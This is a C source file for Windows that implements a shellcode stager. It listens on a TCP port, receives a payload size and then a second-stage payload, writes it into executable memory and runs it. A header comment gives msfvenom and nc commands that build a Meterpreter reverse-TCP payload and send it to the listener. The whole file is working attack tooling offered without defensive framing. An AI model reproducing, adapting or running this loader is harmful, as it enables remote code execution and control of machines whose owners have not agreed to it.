#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

/*
	1.	msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c 2>&1 | grep -i "payload size"
		printf '%08x' 203864 
		echo -e '\x00\x03\x1c\x58' | nc -v 127.0.0.1 443

	2.  msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= lport= -f c > met.c
		tail -n +2 met.c > met2.c
		cat met2.c | tr -d "\"" | tr -d ";" | tr -d  '\n' > met.c
		echo -e `cat met.c` | nc -v <listener ip> <listener port>
*/

int main(int argc, const char * argv[])
{
	PCSTR port;

	if (argc == 2)
	{
		port = argv[1];
	}
	else
	{
		port = "443";
	}

	LPWSADATA wsaData = new WSAData();
	ADDRINFOA* socketHint = new ADDRINFOA();
	ADDRINFOA* addressInfo = new ADDRINFOA();
	SOCKET listenSocket = INVALID_SOCKET;
	SOCKET clientSocket = INVALID_SOCKET;

	char stage2bufbig[4] = {};
	INT receivedBytes = 0;

	socketHint->ai_family = AF_INET;
	socketHint->ai_socktype = SOCK_STREAM;
	socketHint->ai_protocol = IPPROTO_TCP;
	socketHint->ai_flags = AI_PASSIVE;

	WSAStartup(MAKEWORD(2, 2), wsaData);
	GetAddrInfoA(NULL, port, socketHint, &addressInfo);

	listenSocket = socket(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol);
	bind(listenSocket, addressInfo->ai_addr, addressInfo->ai_addrlen);
	listen(listenSocket, SOMAXCONN);
	
	printf("[+] starting listener on port %s\n", port);
	
	clientSocket = accept(listenSocket, NULL, NULL);
	
	receivedBytes = recv(clientSocket, stage2bufbig, 4, NULL);

	char stage2buflittle[4] = {};
	int position = 4;

	//convert big- to little-endian
	for (int i = 0; i < 4; i++)
	{
		stage2buflittle[i] = stage2bufbig[position - 1];
		position--;
	}

	unsigned int stage2size = ( ((unsigned char)stage2buflittle[3] << 24) | ((unsigned char)stage2buflittle[2] << 16) | ((unsigned char)stage2buflittle[1] << 8) | (unsigned char)stage2buflittle[0]);

	printf("[+] received stage2 size: [%d] bytes\n", stage2size);

	LPVOID shellcode = VirtualAlloc(NULL, stage2size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID bakAddr = shellcode;
	
	shutdown(clientSocket, 2);
	clientSocket = accept(listenSocket, NULL, NULL);

	printf("[*] waiting for the payload...\n");

	int receivedAll = 0;
	do
	{
		receivedBytes = recv(clientSocket, (char *)shellcode, stage2size, NULL);
		receivedAll += receivedBytes;
		printf("receivedBytes: %d\n", receivedBytes);
		shellcode = ((char*)shellcode) + receivedBytes;
		stage2size = stage2size - receivedBytes;
		printf("left: %d\n", stage2size);
	} while (stage2size > 0);

	((void(*)())bakAddr)();
}